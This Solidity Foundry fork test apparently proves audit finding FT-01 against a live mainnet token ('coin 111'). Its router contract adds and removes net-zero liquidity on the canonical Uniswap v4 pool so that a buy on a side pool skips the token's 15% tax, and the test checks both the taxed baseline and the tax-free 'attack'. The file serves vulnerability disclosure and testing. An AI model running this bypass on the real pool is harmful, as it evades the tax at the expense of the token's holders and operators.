// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Test} from "forge-std/Test.sol";

import {ArtCoinsToken} from "../../../../src/ArtCoinsToken.sol";

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IHooks} from "@uniswap/v4-core/src/interfaces/IHooks.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {IUnlockCallback} from "@uniswap/v4-core/src/interfaces/callback/IUnlockCallback.sol";
import {StateLibrary} from "@uniswap/v4-core/src/libraries/StateLibrary.sol";
import {TickMath} from "@uniswap/v4-core/src/libraries/TickMath.sol";
import {TransientStateLibrary} from "@uniswap/v4-core/src/libraries/TransientStateLibrary.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {PoolId} from "@uniswap/v4-core/src/types/PoolId.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";

/// @notice one unlock router. modes:
///         0 seed: add single sided PCT liquidity to a pool (pays PCT)
///         1 buy:  optionally add+remove on the canonical pool first (net
///                 zero), then buy PCT with ETH on a side pool and take it.
contract FTForkRouter is IUnlockCallback {
    using TransientStateLibrary for IPoolManager;

    IPoolManager immutable pm;
    IERC20 immutable pct;

    constructor(IPoolManager pm_, IERC20 pct_) {
        pm = pm_;
        pct = pct_;
    }

    struct Args {
        uint8 mode;
        PoolKey key; // seed target, or side pool for a buy
        PoolKey canon;
        int24 lo;
        int24 hi;
        int24 canonLo;
        int24 canonHi;
        uint256 liq;
        uint256 ethIn;
        address to;
    }

    receive() external payable {}

    function run(Args memory a) external payable returns (uint256 taken) {
        taken = abi.decode(pm.unlock(abi.encode(a)), (uint256));
    }

    function unlockCallback(bytes calldata raw) external returns (bytes memory) {
        Args memory a = abi.decode(raw, (Args));
        if (a.mode == 0) {
            pm.modifyLiquidity(
                a.key,
                IPoolManager.ModifyLiquidityParams(a.lo, a.hi, int256(a.liq), bytes32(0)),
                ""
            );
            _settleOwed();
            return abi.encode(uint256(0));
        }
        if (a.liq != 0) {
            IPoolManager.ModifyLiquidityParams memory p =
                IPoolManager.ModifyLiquidityParams(a.canonLo, a.canonHi, int256(a.liq), bytes32("ft"));
            pm.modifyLiquidity(a.canon, p, "");
            p.liquidityDelta = -int256(a.liq);
            pm.modifyLiquidity(a.canon, p, "");
        }
        pm.swap(
            a.key,
            IPoolManager.SwapParams({
                zeroForOne: true,
                amountSpecified: -int256(a.ethIn),
                sqrtPriceLimitX96: TickMath.MIN_SQRT_PRICE + 1
            }),
            ""
        );
        _settleOwed();
        int256 d = pm.currencyDelta(address(this), Currency.wrap(address(pct)));
        uint256 taken = uint256(d);
        pm.take(Currency.wrap(address(pct)), a.to, taken);
        return abi.encode(taken);
    }

    /// @dev pays any negative ETH / PCT delta (rounding or seed amounts).
    function _settleOwed() internal {
        int256 e = pm.currencyDelta(address(this), Currency.wrap(address(0)));
        if (e < 0) pm.settle{value: uint256(-e)}();
        int256 t = pm.currencyDelta(address(this), Currency.wrap(address(pct)));
        if (t < 0) {
            pm.sync(Currency.wrap(address(pct)));
            pct.transfer(address(pm), uint256(-t));
            pm.settle();
        }
    }
}

/// @title  FactoryTokenForkTest
/// @notice live proof of FT-01 against coin 111 on mainnet state: a net zero
///         add+remove on 111's canonical pool lets a buy on a side v4 pool
///         skip the 15% venue tax.
contract FactoryTokenForkTest is Test {
    using StateLibrary for IPoolManager;

    IPoolManager constant PM = IPoolManager(0x000000000004444c5dc75cB358380D2e3dE08A90);
    address constant COIN_111 = 0x61C9d89fe1212F6b55fF888816A151463287B8ae;
    address constant LIVE_HOOK = 0x636c050296B5Cc528D8785169Bf8923716FCa9cc;
    uint256 constant FORK_BLOCK = 26_130_269;

    ArtCoinsToken coin;
    FTForkRouter router;
    PoolKey canon;
    PoolKey side;
    bool onFork;

    function setUp() public {
        string memory rpc =
            vm.envOr("MAINNET_RPC_URL", string("https://mainnet.gateway.tenderly.co"));
        try vm.createSelectFork(rpc, vm.envOr("FORK_BLOCK", FORK_BLOCK)) {
            onFork = true;
        } catch {
            return;
        }
        coin = ArtCoinsToken(COIN_111);
        router = new FTForkRouter(PM, IERC20(COIN_111));
        canon = PoolKey(
            Currency.wrap(address(0)), Currency.wrap(COIN_111), 0x800000, 200, IHooks(LIVE_HOOK)
        );
        side = PoolKey(Currency.wrap(address(0)), Currency.wrap(COIN_111), 3000, 60, IHooks(address(0)));
    }

    function _alignDown(int24 t, int24 s) internal pure returns (int24) {
        int24 r = t / s * s;
        if (t < 0 && r != t) r -= s;
        return r;
    }

    function test_bug_FT01_live111_addRemoveCanonicalSkipsSidePoolTax() public {
        if (!onFork) vm.skip(true);
        assertEq(PoolId.unwrap(_id(canon)), coin.canonicalPoolId(), "canonical key");
        (uint160 sqrtP, int24 tick,,) = PM.getSlot0(_id(canon));
        assertTrue(sqrtP != 0, "canonical pool live");

        // side pool: no hook, same price, single sided PCT liquidity below price
        PM.initialize(side, sqrtP);
        int24 sTop = _alignDown(tick, 60) - 60;
        deal(COIN_111, address(router), 50_000_000e18);
        vm.deal(address(router), 100 ether);
        FTForkRouter.Args memory a;
        a.mode = 0;
        a.key = side;
        a.lo = sTop - 6000;
        a.hi = sTop;
        a.liq = 1e24;
        router.run(a);

        // baseline: side pool buy pays the 15% tax
        address alice = makeAddr("alice");
        a.mode = 1;
        a.liq = 0;
        a.ethIn = 0.05 ether;
        a.to = alice;
        uint256 takenA = router.run(a);
        assertGt(takenA, 0);
        assertEq(coin.balanceOf(alice), takenA - takenA * 1500 / 10_000, "taxed baseline");

        // attack: same buy, preceded by add+remove of the router's own
        // position on the canonical pool inside the same unlock. no PCT
        // leaves the pool manager for the canonical pool (deltas net out).
        address bob = makeAddr("bob");
        int24 cTop = _alignDown(tick, 200) - 200;
        a.canon = canon;
        a.canonLo = cTop - 4000;
        a.canonHi = cTop;
        a.liq = 1e25;
        a.to = bob;
        uint256 routerPctBefore = coin.balanceOf(address(router));
        uint256 takenB = router.run(a);
        assertGt(takenB, 0);
        assertEq(coin.balanceOf(bob), takenB, "side pool buy fully exempt");
        assertLe(routerPctBefore - coin.balanceOf(address(router)), 2, "only rounding wei spent");
    }

    function _id(PoolKey memory k) internal pure returns (PoolId) {
        return PoolId.wrap(keccak256(abi.encode(k)));
    }
}
